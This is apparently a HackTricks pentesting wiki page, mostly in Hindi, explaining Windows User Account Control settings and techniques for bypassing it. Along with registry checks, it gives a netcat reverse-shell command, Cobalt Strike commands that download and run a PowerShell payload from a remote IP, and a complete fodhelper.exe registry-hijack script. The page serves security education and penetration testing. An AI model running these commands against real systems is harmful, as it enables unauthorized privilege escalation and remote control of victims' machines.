# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक ऐसी सुविधा है जो **उच्च-स्तरीय गतिविधियों के लिए सहमति प्रॉम्प्ट** सक्षम करती है। Applications के अलग-अलग `integrity` स्तर होते हैं, और एक प्रोग्राम जिसके पास **high level** है वह ऐसे कार्य कर सकता है जो **सिस्टम को संभावित रूप से खराब कर सकते हैं**। जब UAC सक्षम होता है, तो applications और tasks हमेशा **एक गैर-व्यवस्थापक खाते के सुरक्षा संदर्भ में चलते हैं** जब तक कि किसी व्यवस्थापक द्वारा स्पष्ट रूप से इन applications/tasks को व्यवस्थापक-स्तरीय पहुँच देने की अनुमति न दी जाए। यह एक सुविधा है जो व्यवस्थापकों को अनचाहे परिवर्तन से बचाती है, लेकिन इसे सुरक्षा सीमा माना नहीं जाता।

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

जब UAC लागू होता है, तो एक व्यवस्थापक उपयोगकर्ता को 2 टोकन दिए जाते हैं: एक standard user key, जो सामान्य स्तर पर नियमित क्रियाएँ करने के काम आता है, और एक जो व्यवस्थापक विशेषाधिकारों के साथ होता है।

यह [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) काफी गहराई से बताती है कि UAC कैसे काम करता है और इसमें logon प्रक्रिया, उपयोगकर्ता अनुभव, और UAC आर्किटेक्चर शामिल हैं। व्यवस्थापक सुरक्षा नीतियों का उपयोग करके स्थानीय स्तर पर (secpol.msc का उपयोग करके) यह कॉन्फ़िगर कर सकते हैं कि UAC उनके संगठन के लिए कैसे कार्य करे, या Active Directory डोमेन वातावरण में Group Policy Objects (GPO) के माध्यम से कॉन्फ़िगर और पुश किया जा सकता है। विभिन्न सेटिंग्स का विवरण [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) में दिया गया है। UAC के लिए 10 Group Policy सेटिंग्स हो सकती हैं जिन्हें सेट किया जा सकता है। निम्न तालिका अतिरिक्त विवरण देती है:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled                                                     |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled                                                     |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries                  |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop                 |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled                                                     |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled                                                      |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled                                                      |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled                                                      |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled                                                      |

### UAC Bypass Theory

कुछ प्रोग्राम **autoelevated automatically** हो जाते हैं यदि **उपयोगकर्ता administrator समूह का सदस्य** होता है। इन बायनरीज़ के अंदर उनके _**Manifests**_ में _**autoElevate**_ विकल्प का मान _**True**_ होता है। बाइनरी को **Microsoft द्वारा साइन** भी होना चाहिए।

कई auto-elevate प्रक्रियाएँ **COM objects या RPC servers के माध्यम से कार्यक्षमता एक्सपोज़ करती हैं**, जिन्हें medium integrity (सामान्य उपयोगकर्ता-स्तर विशेषाधिकार) के साथ चल रहे प्रॉसेस से invoke किया जा सकता है। ध्यान दें कि COM (Component Object Model) और RPC (Remote Procedure Call) Windows प्रोग्रामों के बीच प्रक्रियाओं के पार संचार और कार्य निष्पादन के तरीके हैं। उदाहरण के लिए, **`IFileOperation COM object`** फाइल ऑपरेशनों (कॉपि, डिलीट, मूव) को हैंडल करने के लिए डिज़ाइन किया गया है और बिना प्रॉम्प्ट के privileges को स्वतः elevate कर सकता है।

ध्यान दें कि कुछ चेक किए जा सकते हैं, जैसे यह जाँचना कि प्रक्रिया **System32 directory** से चलाई गई थी या नहीं, जिसे उदाहरण के लिए **explorer.exe** या किसी अन्य System32-स्थित executable में inject करके बाईपास किया जा सकता है।

इन चेक्स को बाईपास करने का एक और तरीका PEB को **modify** करना है। Windows में हर प्रक्रिया का एक Process Environment Block (PEB) होता है, जिसमें प्रक्रिया के बारे में महत्वपूर्ण डेटा शामिल होता है, जैसे इसका executable path। PEB को संशोधित करके, हम अपने खतरनाक प्रक्रिया के स्थान को नकली (spoof) कर सकते हैं, ताकि यह विश्वसनीय डायरेक्टरी (जैसे system32) से चल रही प्रतीत हो। यह स्पूफ्ड जानकारी COM object को बिना प्रॉम्प्ट के auto-elevate करने में धोखा देती है।

फिर, UAC को **बाईपास** करने के लिए (medium integrity level से **high** तक उठने के लिए) कुछ अटैकर्स ऐसे बाइनरीज़ का उपयोग कर arbitrary code execute कराते हैं क्योंकि वह कोड **High level integrity process** से execute होगा।

आप किसी बाइनरी के _**Manifest**_ को Sysinternals का टूल _**sigcheck.exe**_ से चेक कर सकते हैं. (`sigcheck.exe -m <file>`) और आप प्रक्रियाओं के **integrity level** को _Process Explorer_ या _Process Monitor_ (of Sysinternals) का उपयोग करके देख सकते हैं।

### Check UAC

To confirm if UAC is enabled do:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
अगर यह **`1`** है तो UAC **सक्रिय** है, अगर यह **`0`** है या यह मौजूद नहीं है, तो UAC **निष्क्रिय** है।

फिर, जाँचें कि **कौन सा स्तर** कॉन्फ़िगर किया गया है:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** तो, UAC prompt नहीं करेगा (जैसे **निष्क्रिय**)
- If **`1`** तो admin से **username और password मांगा जाता है** ताकि बाइनरी को उच्च अधिकारों के साथ चलाया जा सके (on Secure Desktop)
- If **`2`** (**हमेशा मुझे सूचित करें**) UAC हमेशा administrator से पुष्टि मांगेगा जब वह उच्च privileges के साथ कुछ चलाने की कोशिश करेगा (on Secure Desktop)
- If **`3`** `1` जैसा है पर Secure Desktop पर आवश्यक नहीं
- If **`4`** `2` जैसा है पर Secure Desktop पर आवश्यक नहीं
- if **`5`**(**डिफ़ॉल्ट**) तो यह administrator से पुष्टि मांगेगा ताकि non Windows binaries उच्च privileges के साथ चल सकें

Then, you have to take a look at the value of **`LocalAccountTokenFilterPolicy`**\
If the value is **`0`**, तो केवल **RID 500** user (**built-in Administrator**) ही **admin tasks बिना UAC के** कर सकता है, और अगर यह `1` है, तो **"Administrators"** group के सभी accounts ये कर सकते हैं।

And, finally take a look at the value of the key **`FilterAdministratorToken`**\
If **`0`**(default), तो **built-in Administrator account** remote administration tasks कर सकता है और अगर **`1`** है तो built-in Administrator remote administration tasks नहीं कर सकता, जब तक कि `LocalAccountTokenFilterPolicy` को `1` पर न सेट किया गया हो।

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **किसी के लिए भी UAC नहीं**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , किसी के लिए भी UAC नहीं**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, RID 500 (Built-in Administrator) के लिए UAC नहीं**
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, सभी के लिए UAC**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> ध्यान दें कि अगर आपके पास पीड़ित तक ग्राफिकल एक्सेस है, तो UAC bypass सीधा है क्योंकि आप UAC prompt आने पर बस "Yes" पर क्लिक कर सकते हैं

UAC bypass की आवश्यकता निम्न स्थिति में होती है: **UAC सक्रिय है, आपकी प्रक्रिया medium integrity context में चल रही है, और आपका उपयोगकर्ता administrators group का सदस्य है।**

यह बताना जरूरी है कि UAC को बायपास करना **काफी कठिन** होता है जब यह उच्चतम सुरक्षा स्तर (Always) पर सेट हो, बनिस्बत अन्य स्तरों (Default) पर होने के।

### UAC disabled

यदि UAC पहले से ही disabled है (`ConsentPromptBehaviorAdmin` is **`0`**) तो आप **admin privileges के साथ एक reverse shell execute** (high integrity level) कर सकते हैं, उदाहरण के लिए:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/
- https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html

### **बहुत** बुनियादी UAC "bypass" (full file system access)

यदि आपके पास ऐसा shell है जिसमें user Administrators group का सदस्य है, तो आप SMB के माध्यम से साझा किए गए **mount the C$** को लोकल रूप से एक नए डिस्क में कर सकते हैं और आपको **access to everything inside the file system** मिल जाएगा (यहाँ तक कि Administrator home folder भी)।

> [!WARNING]
> **ऐसा लगता है कि यह ट्रिक अब काम नहीं कर रही है**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike techniques केवल तभी काम करेंगे यदि UAC अपने अधिकतम सुरक्षा स्तर पर सेट न हो।
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** और **Metasploit** में भी कई मॉड्यूल हैं जो **UAC** को **bypass** करने के लिए उपयोग किए जा सकते हैं।

### KRBUACBypass

दस्तावेज़ और टूल: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) जो कई UAC bypass exploits का **संकलन** है। ध्यान दें कि आपको **UACME को Visual Studio या msbuild का उपयोग करके compile करना होगा**। संकलन कई executables बनाएगा (जैसे `Source\Akagi\outout\x64\Debug\Akagi.exe`), इसलिए आपको पता होना चाहिए **किसकी आपको आवश्यकता है।**\
आपको **सावधान** रहना चाहिए क्योंकि कुछ bypasses कुछ अन्य प्रोग्राम्स को prompt कर सकते हैं जो **user** को सचेत कर देंगे कि कुछ हो रहा है।

UACME में यह बताया गया है कि किस **build version से प्रत्येक technique काम करना शुरू हुई**। आप अपने versions को प्रभावित करने वाली technique खोज सकते हैं:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

The trusted binary `fodhelper.exe` is auto-elevated on modern Windows. When launched, it queries the per-user registry path below without validating the `DelegateExecute` verb. Planting a command there allows a Medium Integrity process (user is in Administrators) to spawn a High Integrity process without a UAC prompt.

fodhelper द्वारा क्वेरी की गई Registry path:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell चरण (अपना payload सेट करें, फिर trigger करें):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
नोट्स:
- तब काम करता है जब वर्तमान उपयोगकर्ता Administrators का सदस्य हो और UAC स्तर default/lenient हो (Always Notify with extra restrictions नहीं)।
- 64-bit Windows पर 32-bit प्रक्रिया से 64-bit PowerShell शुरू करने के लिए `sysnative` path का उपयोग करें।
- Payload कोई भी कमांड हो सकती है (PowerShell, cmd, या कोई EXE path)। Stealth के लिए prompting UIs से बचें।

#### अधिक UAC bypass

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ should works)

### UAC Bypass with GUI

यदि आपके पास GUI की पहुँच है तो जब UAC prompt आएगा आप बस उसे accept कर सकते हैं, आपको वास्तव में bypass की ज़रूरत नहीं है। इसलिए, GUI की पहुँच पाने से आप UAC को bypass कर पाएँगे।

इसके अलावा, यदि आपको ऐसा GUI session मिल जाता है जिसे कोई उपयोगकर्ता इस्तेमाल कर रहा था (संभावित रूप से RDP के माध्यम से), तो वहाँ कुछ ऐसे tools होंगे जो administrator के रूप में चल रहे होंगे जिनसे आप सीधे उदाहरण के लिए **cmd** को **as admin** चलाने जैसे काम कर सकते हैं बिना फिर से UAC द्वारा prompt किए गए — जैसे [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)। यह थोड़ा अधिक **stealthy** हो सकता है।

### Noisy brute-force UAC bypass

यदि आपको noisy होने की परवाह नहीं है तो आप हमेशा इस तरह के टूल चला सकते हैं: [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) जो **ask to elevate permissions until the user does accepts it**।

### Your own bypass - Basic UAC bypass methodology

यदि आप **UACME** को देखेंगे तो ध्यान देंगे कि **most UAC bypasses abuse a Dll Hijacking vulnerability** (मुख्यतः malicious dll को _C:\Windows\System32_ पर लिखकर)। [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Find a binary that will **autoelevate** (यह जाँचें कि जब इसे execute किया जाता है तो यह high integrity level पर चलता है)।
2. procmon के साथ उन "**NAME NOT FOUND**" events को खोजें जो **DLL Hijacking** के लिए vulnerable हो सकते हैं।
3. सम्भवत: आपको कुछ **protected paths** (जैसे C:\Windows\System32) के अंदर DLL **write** करनी पड़ेगी जहाँ आपकी writing permissions नहीं हैं। इसे bypass करने के लिए आप निम्न का उपयोग कर सकते हैं:
   1. **wusa.exe**: Windows 7,8 और 8.1। यह CAB file की सामग्री को protected paths के अंदर extract करने की अनुमति देता है (क्योंकि यह टूल high integrity level से execute होता है)।
   2. **IFileOperation**: Windows 10।
4. अपने DLL को protected path में copy करने और vulnerable तथा autoelevated binary को execute करने के लिए एक **script** तैयार करें।

### Another UAC bypass technique

यह इस बात को देखने पर आधारित है कि क्या कोई **autoElevated binary** registry से किसी **binary** या **command** के **name/path** को **read** करने की कोशिश करता है जिसे **executed** किया जाना है (यह तब अधिक दिलचस्प होता है जब binary यह जानकारी **HKCU** के अंदर खोजता है)।

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
